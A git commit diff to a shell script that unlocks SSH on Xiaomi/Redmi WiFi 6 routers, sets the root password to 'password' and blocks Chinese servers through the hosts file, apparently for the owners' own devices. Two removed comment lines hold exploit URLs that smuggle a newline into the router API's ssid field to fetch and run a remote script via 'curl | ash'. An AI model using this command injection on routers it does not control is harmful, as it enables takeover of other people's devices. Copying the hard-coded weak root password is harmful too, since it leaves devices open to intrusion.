4eed6b4aa98755a153e96c4e76589cb2c92f6240
KaMyKaSii <KaMyKaSii@users.noreply.github.com>
2021-02-19 20:07:24 -0300

    Update and rename unlockssh.sh to unlock_ssh_and_disable_chinese_servers.sh

--- unlock_ssh_and_disable_chinese_servers.sh
+++ unlock_ssh_and_disable_chinese_servers.sh
@@ -9,6 +9,8 @@ sed -i '/flg_ssh.*release/ { :a; N; /fi/! ba };/return 0/d' /etc/init.d/dropbear
 echo -e "password\npassword" | passwd root
 /etc/init.d/dropbear enable
 /etc/init.d/dropbear start
+#Try to preserve modified dropbear file on upgrade
+echo "/etc/init.d/dropbear" >> /etc/sysupgrade.conf
 
 cat << 'EOF' >> /etc/hosts
 
@@ -27,5 +29,3 @@ ff02::2 ip6-allrouters
 EOF
 
 reboot
-# http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Acurl%20--insecure%20https%3A%2F%2Fdev.melmac.net%2Fax3600.sh%20%7C%20ash%0A
-# /api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Acurl%20--insecure%20https%3A%2F%2Fgithub.com%2FKaMyKaSii%2FUnlock-SSH-on-Xiaomi-and-Redmi-WiFi-6-routers%2Fraw%2Fmaster%2Funlockssh.sh%20%7C%20ash%0A
